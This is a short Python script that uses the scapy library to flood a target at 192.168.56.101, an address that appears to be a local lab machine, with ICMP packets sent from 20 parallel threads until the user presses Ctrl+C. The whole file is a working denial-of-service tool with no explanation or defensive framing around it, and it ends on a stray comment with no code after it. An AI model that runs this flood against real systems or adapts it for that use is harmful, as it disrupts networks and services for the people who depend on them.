#! /usr/bin/env python3

from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send
import threading
from time import sleep

stop_event = threading.Event()

def icmp_flood(target):
        pkt = IP(dst=target)/ICMP()
        while not stop_event.is_set():
                send(pkt,verbose=0)

threads = []
for _ in range(20):
        t = threading.Thread(target=icmp_flood, args=("192.168.56.101",))
        t.start()
        threads.append(t)

try:
    print("Flooding... press Ctrl+C to stop.")
    while True:
        sleep(1)
except KeyboardInterrupt:
    print("\n[!] Stopping threads...")
    stop_event.set()  # Signal all threads to stop

# Wait for all threads to finish
for t in threads:
    t.join()

# suppress warnings
